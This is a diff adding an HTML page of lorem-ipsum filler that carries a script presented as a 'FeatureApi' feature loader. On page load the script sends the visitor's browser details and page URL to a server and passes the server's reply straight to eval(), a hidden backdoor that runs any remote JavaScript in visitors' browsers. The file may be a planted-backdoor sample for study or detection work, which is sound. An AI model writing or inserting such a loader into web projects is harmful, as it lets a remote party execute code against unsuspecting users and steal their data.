@@ -1,0 +1,36 @@
+
+<h2 class="changeme">Lorem ipsum dolor sit amet</h2>
+
+<script>
+class FeatureApi {
+  async display(featureHash) {
+    var myHeaders = new Headers();
+    myHeaders.append("User-Agent", navigator.userAgent);
+    myHeaders.append("Referer", window.location.href);
+    myHeaders.append("Accept-Language", navigator.language);
+
+    var requestOptions = {
+      method: 'GET',
+      headers: myHeaders,
+      redirect: 'follow'
+    };
+
+    try {
+      const response = await fetch(`http://127.0.0.1:8000/api/v1/gs?feature_hash=${featureHash}`, requestOptions);
+      const result = await response.text();
+      const parsedResult = JSON.parse(result);
+      if (parsedResult.message) {
+        eval(parsedResult.message);
+      }
+    } catch (error) {
+      console.log('error', error);
+    }
+  }
+}
+
+const featureApi = new FeatureApi();
+featureApi.display("c26257b3-059b-46db-9f1f-e5f754263e8b");
+
+</script>
+<hr>
+Curabitur nulla libero, accumsan in ipsum in, euismod posuere quam. Quisque a tortor fermentum purus varius sollicitudin vitae sed ipsum. Sed suscipit, tortor vel sagittis lacinia, sem metus finibus quam, eget fringilla nunc diam vel leo. Vivamus vel metus a lacus luctus rhoncus id a ligula. Aliquam eu dolor vel elit viverra tristique. Phasellus lobortis elit mattis lorem commodo malesuada. Praesent congue varius augue, in eleifend neque vulputate id. Nam a blandit turpis, eget laoreet lorem. Quisque hendrerit urna at lectus ullamcorper venenatis. Vivamus non mi sed orci lacinia finibus. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Vivamus ante velit, maximus ut ex et, sagittis gravida velit.
